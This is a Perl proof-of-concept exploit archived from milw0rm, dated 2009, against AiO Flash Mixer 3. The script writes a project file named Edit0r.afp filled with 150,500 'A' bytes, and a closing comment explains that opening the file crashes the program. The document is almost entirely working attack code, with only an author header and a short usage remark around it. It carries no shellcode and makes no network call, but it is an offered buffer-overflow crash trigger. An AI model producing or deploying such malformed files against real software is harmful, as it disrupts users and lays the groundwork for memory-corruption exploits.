#!/usr/bin/perl
#[+] Bug : AiO ( All into One) Flash Mixer 3 (.afp File) Crash Vulnerability Exploit
#[+] program  Download : http://www.goztun.com/download/AiOFlashMixerSetup.exe
#[+] Author : the_Edit0r
# Contact me : the_3dit0r[at]Yahoo[dot]coM
#[+] Greetz to all my friends
#[+] Tested on: Windows XP Pro SP3
#[+] web site: Expl0iters.ir  * Anti-security.ir
#[+] Big thnx: H4ckcity Member


my $crash="\x41" x 150500;
open(myfile,'>>Edit0r.afp'); # jpg , Bmp , Png , Gif
print myfile $crash;
print "File Created successfully\n";

# After Clicking On file Perl  Run The Program  ,Opened Project  ( Add Pictures ) Boom !!!!!!! the Program Crashed

# milw0rm.com [2009-08-24]